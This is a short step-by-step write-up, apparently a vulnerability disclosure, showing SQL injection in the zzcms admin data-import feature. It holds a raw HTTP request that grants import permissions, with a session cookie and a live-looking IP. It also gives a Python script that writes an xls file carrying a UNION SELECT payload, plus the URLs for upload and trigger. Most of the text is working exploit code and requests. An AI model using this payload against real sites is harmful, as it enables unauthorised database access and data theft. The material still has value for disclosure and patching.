1.First, log in to the admin account in the backend, and grant the account permission to import files.

```http
POST /admin/admingroup.php?do=save HTTP/1.1
Host: 
Content-Length: 1996
Cache-Control: max-age=0
Origin: http://149.104.27.102
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://149.104.27.102/admin/admingroup.php?do=modify&id=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: tablename=zzcms_tagzs; PHPSESSID=itqont0dtdgergum8jrf343v57; __51cke__=; __tins__713776=%7B%22sid%22%3A%201730786337232%2C%20%22vd%22%3A%2013%2C%20%22expires%22%3A%201730789563438%7D; __51laig__=13
Connection: close

groupname=%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98&config%5B%5D=zs&config%5B%5D=zs_modify&config%5B%5D=zs_del&config%5B%5D=zsclass&config%5B%5D=zskeyword&config%5B%5D=dl&config%5B%5D=dl_add&config%5B%5D=dl_modify&config%5B%5D=dl_del&config%5B%5D=dl_import&config%5B%5D=guestbook&config%5B%5D=zhanhui&config%5B%5D=zhanhui_add&config%5B%5D=zhanhui_modify&config%5B%5D=zhanhui_del&config%5B%5D=zhanhuiclass&config%5B%5D=zx&config%5B%5D=zx_add&config%5B%5D=zx_modify&config%5B%5D=zx_del&config%5B%5D=zxclass&config%5B%5D=zxpinglun&config%5B%5D=zxtag&config%5B%5D=pp&config%5B%5D=pp_modify&config%5B%5D=pp_del&config%5B%5D=job&config%5B%5D=job_modify&config%5B%5D=job_del&config%5B%5D=jobclass&config%5B%5D=special&config%5B%5D=special_add&config%5B%5D=special_modify&config%5B%5D=special_del&config%5B%5D=specialclass&config%5B%5D=wangkan&config%5B%5D=wangkan_add&config%5B%5D=wangkan_modify&config%5B%5D=wangkan_del&config%5B%5D=wangkanclass&config%5B%5D=baojia&config%5B%5D=baojia_modify&config%5B%5D=baojia_del&config%5B%5D=ask&config%5B%5D=ask_add&config%5B%5D=ask_modify&config%5B%5D=ask_del&config%5B%5D=askclass&config%5B%5D=adv&config%5B%5D=adv_add&config%5B%5D=adv_modify&config%5B%5D=adv_del&config%5B%5D=advclass&config%5B%5D=adv_user&config%5B%5D=user&config%5B%5D=user_modify&config%5B%5D=user_del&config%5B%5D=usernoreg&config%5B%5D=userclass&config%5B%5D=usergroup&config%5B%5D=friendlink&config%5B%5D=friendlink_add&config%5B%5D=friendlink_modify&config%5B%5D=friendlink_del&config%5B%5D=about&config%5B%5D=about_add&config%5B%5D=about_modify&config%5B%5D=about_del&config%5B%5D=label&config%5B%5D=label_add&config%5B%5D=label_modify&config%5B%5D=label_del&config%5B%5D=licence&config%5B%5D=fankui&config%5B%5D=badusermessage&config%5B%5D=uploadfiles&config%5B%5D=sendmessage&config%5B%5D=sendmail&config%5B%5D=sendsms&config%5B%5D=announcement&config%5B%5D=helps&config%5B%5D=siteconfig&config%5B%5D=adminmanage&config%5B%5D=admingroup&id=1&action=modify&Save=%E4%BF%AE%E6%94%B9
```

2.Create an xls file, insert the ID in the first column, and insert the SQL statement to be injected in the eighth column.

```python
import xlwt
workbook = xlwt.Workbook()
sheet = workbook.add_sheet("Sheet1")
sheet.write(0,0,1)
sheet.write(0,1,"hello")
sheet.write(0,2,"13612345678")
sheet.write(0,3,"123@qq.com")
sheet.write(0,4,"title")
sheet.write(0,5,"beijing")
sheet.write(0,6,"hahaha")
sheet.write(0,7,"\\\' union select 1,2231312,3#")
workbook.save("2.xls")

```

3.Go to /admin/dl_data.php, then click "Select File" (choose the xls file you just created), upload it, and import it into the database.

<img src=".\img\1.png">  



4.go to /q/show.php?id=1(The value of id corresponds to the first column in the xls file.)

<img src=".\img\2.png">